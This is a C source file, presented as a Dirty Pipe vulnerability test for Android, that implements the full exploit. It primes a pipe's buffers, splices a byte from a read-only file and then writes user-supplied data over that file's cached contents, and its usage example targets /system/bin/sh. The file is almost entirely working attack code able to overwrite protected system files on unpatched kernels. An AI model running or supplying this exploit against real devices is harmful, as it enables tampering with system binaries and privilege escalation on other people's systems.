/* Dirty Pipe vulnerability test - targeting Android */
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2])
{
    if (pipe(p))
        abort();
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    for (unsigned r = pipe_size; r > 0;)
    {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    for (unsigned r = pipe_size; r > 0;)
    {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main(int argc, char **argv)
{
    if (argc < 4)
    {
        printf("Usage: %s <file> <offset> <data>\n", argv[0]);
        printf("Example: %s /system/bin/sh 1 XXXX\n", argv[0]);
        printf("\nThis tests if Dirty Pipe vulnerability exists.\n");
        return 1;
    }

    const char *path = argv[1];
    loff_t offset = atoll(argv[2]);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    printf("[*] Target: %s\n", path);
    printf("[*] Offset: %lld\n", (long long)offset);
    printf("[*] Data: %s (len=%zu)\n", data, data_size);

    if (offset % PAGE_SIZE == 0)
    {
        fprintf(stderr, "[-] Cannot start at page boundary\n");
        return 1;
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    if (offset + (loff_t)data_size > next_page)
    {
        fprintf(stderr, "[-] Cannot cross page boundary\n");
        return 1;
    }

    int fd = open(path, O_RDONLY);
    if (fd < 0)
    {
        perror("[-] open failed");
        return 1;
    }

    struct stat st;
    if (fstat(fd, &st))
    {
        perror("[-] stat failed");
        return 1;
    }

    if (offset + (loff_t)data_size > st.st_size)
    {
        fprintf(stderr, "[-] Offset+data exceeds file size\n");
        return 1;
    }

    printf("[*] File size: %lld\n", (long long)st.st_size);

    int p[2];
    prepare_pipe(p);

    --offset;
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0)
    {
        perror("[-] splice failed");
        return 1;
    }
    if (nbytes == 0)
    {
        fprintf(stderr, "[-] short splice\n");
        return 1;
    }

    printf("[+] splice succeeded\n");

    nbytes = write(p[1], data, data_size);
    if (nbytes < 0)
    {
        perror("[-] write failed");
        return 1;
    }
    if ((size_t)nbytes < data_size)
    {
        fprintf(stderr, "[-] short write\n");
        return 1;
    }

    printf("[+] write succeeded (%zd bytes)\n", nbytes);
    printf("[!] If kernel is vulnerable, file has been modified!\n");
    printf("[!] Verify with: cat %s | xxd | head\n", path);

    close(fd);
    close(p[0]);
    close(p[1]);
    return 0;
}
